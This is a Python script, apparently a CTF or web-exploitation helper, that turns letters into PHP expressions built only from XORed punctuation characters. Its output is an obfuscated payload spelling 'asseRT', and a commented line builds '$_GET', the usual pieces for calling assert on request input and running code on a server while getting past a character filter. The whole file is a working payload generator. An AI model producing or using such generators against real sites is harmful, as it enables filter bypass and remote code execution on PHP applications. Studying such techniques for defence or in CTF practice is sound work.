
import string


get = 'h'
all_key = "'(){$}.;=^_"
blacklist = {'!':"('}'^'\\')","@":"('}'^'=')","[":"('`'^';')","]":"('`'^'=')","|":"('_'^'#')"} 

# abc = {'a':[],'b':[],'c':[],'d':[],'e':[],'f':[],'g':[],'h':[],'i':[],'j':[],'k':[],'l':[],'m':[],'n':[],'o':[],'p':[],'q':[],'r':[],'s':[],'t':[],'u':[],'v':[],'w':[],'x':[],'y':[],'z':[]}
abc = {'a':'','b':'','c':'','d':'','e':'','f':'','g':'','h':'','i':'','j':'','k':'','l':'','m':'','n':'','o':'','p':'','q':'','r':'','s':'','t':'','u':'','v':'','w':'','x':'','y':'','z':''}
ABC = {'A':'','B':'','C':'','D':'','E':'','F':'','G':'','H':'','I':'','J':'','K':'','L':'','M':'','N':'','O':'','P':'','Q':'','R':'','S':'','T':'','U':'','V':'','W':'','X':'','Y':'','Z':''}
num = {'1':'','2':'','3':'','4':'','5':'','6':'','7':'','8':'','9':'','0':''}

temp_sim = string.punctuation
res_simb = dict(zip(temp_sim,['']*len(temp_sim)))

for i in all_key:    
    res_simb[i] = f"'{i}'"


for i in all_key.replace("'",""):
    for j in all_key.replace("'",""):
        cr = chr(ord(i)^ord(j))
        if(cr in abc.keys()):            
            abc[cr] = "('" + i + "' ^ '"  + j + "')"
            break



val = list(filter(lambda x: x != '',abc.values()))

not_empty = lambda y: list(filter(lambda x: y[x] != '',y))  
empty = lambda y: list(filter(lambda x: y[x] == '',y))  


# get uppercase and punctuation
for i in all_key.replace("'",""):
    for a in not_empty(abc):
        x = chr(ord(a)^ord(i))
        if ABC.get(x) != None:                       
            ABC[x] = "(" + abc[a] + '^' + f"'{i}'" + ")"
            break
        if res_simb.get(x) != None:
            if res_simb.get(x) == '':
                res_simb[x] = "(" + abc[a] + '^' + f"'{i}'" + ")"
                break



for i in all_key.replace("'",""):
    for A in not_empty(ABC):
        x = chr(ord(A)^ord(i))
        if abc.get(x) != None:                  
            abc[x] = "(" + ABC[A] + '^' + f"'{i}'" + ")"
            break

        if res_simb.get(x) != None:
            if res_simb.get(x) == '':
                res_simb[x] = "(" + ABC[A] + '^' + f"'{i}'" + ")"
                break


for I in not_empty(ABC):
    for i in not_empty(abc):
        x = chr(ord(I)^ord(i))
        if res_simb.get(x) != None:
            if res_simb.get(x) == '':
                res_simb[x] = "(" + ABC[I] + '^' + f"{abc[i]})" 
                break
        if num.get(x) != None:
            # print(ABC[I],abc[i])
            if num.get(x) == '':            
                num[x] = "("+ ABC[I] + ")" + '^' + f"{abc[i]}"
                break

# print(abc.get('l'))
# exit()
for I in not_empty(ABC):
    for i in not_empty(res_simb):
        x = chr(ord(I)^ord(i))
        # if x == 'l':
        #     print(ABC[I],res_simb[i])
        #     exit()
        if abc.get(x) != None:  
            if abc.get(x) == '' and i != "'":
                # if res_simb[i] in all_key:
                #     abc[x] = "(" + ABC[I] + "^" + f"'{res_simb[i]}'" + ")"
                # else:                      
                abc[x] = "(" + ABC[I] + "^" + f"({res_simb[i]})" + ")"
                # abc[x] = "(" + ABC[I] + ")" + "^" + f"'{res_simb[i]}'"     

# print(abc.get('l'))
# exit()
# print(empty(ABC))

for i in not_empty(abc):
    for I in not_empty(res_simb):
        x = chr(ord(I)^ord(i))                 
        # if(x == 'l'):
        #     print(i)
        #     print(abc[i],res_simb[I])
        #     exit()
        if ABC.get(x) != None:            
            if ABC.get(x) == '' and I != "'": 
                ABC[x] = "(" + abc[i] + "^" + f"({res_simb[I]})" + ")"
        
        if res_simb.get(x) != None: 
            if res_simb.get(x) == '' and i != "'":
                res_simb[x] = "(" + abc[i] + "^" + f"{res_simb[I]}" + ")"

# print(res_simb['['],res_simb[']'])

for i in not_empty(abc):
    for j in not_empty(res_simb):
        x = chr(ord(i)^ord(j))
        # print(x)
        # if(x == 'a'):
        #     # print(i)
        #     print(ABC[i],num[j])
        #     exit()
        # print(x)
        if num.get(x) != None:
            if num.get(x) == '' and j !="'": 
                num[x] = "(" + abc[i] + "^" + f"({res_simb[j]})" + ")"


for i in not_empty(ABC):
    for j in not_empty(num):
        x = chr(ord(i)^ord(j))        
        # print(x)
        if abc.get(x) != None:
            if abc.get(x) == '': 
                abc[x] = "(" + ABC[i] + "^" + f"({num[j]})" + ")"
        

for i in not_empty(abc):
    for j in not_empty(num):
        x = chr(ord(i)^ord(j))        
        # print(x)
        if ABC.get(x) != None:
            if ABC.get(x) == '': 
                ABC[x] = "(" + abc[i] + "^" + f"({num[j]})" + ")"


combine = {**abc,**res_simb,**ABC,**num}

strings = "asseRT"
payload = ".".join([combine[i] for i in strings]).replace('"','').replace(" ","")
print(payload)

# print(F"'$_'.({ABC['G']}).({ABC['E']}).({ABC['T']});")
# print(res_simb['['])
# print(res_simb.values())

